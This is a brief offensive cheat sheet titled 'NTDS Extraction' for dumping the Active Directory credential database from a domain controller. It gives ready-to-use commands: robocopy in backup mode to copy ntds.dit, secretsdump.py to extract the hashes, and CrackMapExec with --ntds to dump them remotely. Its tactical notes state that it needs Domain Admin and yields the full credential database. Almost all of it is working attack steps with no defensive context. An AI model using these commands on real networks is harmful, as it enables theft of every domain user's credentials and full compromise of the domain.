# NTDS Extraction

Goal: Extract domain controller database.

---

# Copy NTDS File

robocopy /B E:\Windows\NTDS .\ntds ntds.dit

---

# Extract with Secretsdump

secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

---

# CrackMapExec Direct NTDS Dump

crackmapexec smb <IP> -u <user> -p <password> --ntds

---

# Tactical Notes

- Requires Domain Admin or equivalent.
- Full credential database extraction.
